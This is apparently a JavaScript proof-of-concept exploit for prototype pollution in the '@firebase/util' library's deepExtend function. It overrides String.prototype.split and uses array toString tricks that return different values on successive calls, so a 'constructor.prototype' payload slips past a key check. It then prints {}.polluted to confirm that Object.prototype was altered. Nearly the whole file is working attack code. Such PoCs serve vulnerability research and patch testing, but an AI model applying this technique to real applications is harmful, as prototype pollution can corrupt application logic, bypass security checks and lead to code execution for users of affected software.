var arg1 = ['constructor'];
var arg2 = ['prototype'];
var flag1 = true;
var flag2 = true;
arg1.toString = function () {
    if (flag1) {
        flag1 = false;
        return 'foo';
    } else {
        return 'constructor';
    }
};
arg2.toString = function () {
    if (flag2) {
        flag2 = false;
        return 'foo';
    } else {
        return 'prototype';
    }
};
String.prototype.split = function () {
    return [
        arg1,
        arg2,
        'polluted'
    ];
};
console.log({}.polluted);
const util = require('@firebase/util');
var payload = JSON.parse('{"constructor.prototype": {"polluted":"yes"}}');
const a = {
    nest: {
        number: 1,
        string: '1',
        object: { key: '1' },
        date: new Date(1),
        nest: { a: 1 }
    }
};
var result = util.deepExtend(a, payload);
console.log({}.polluted);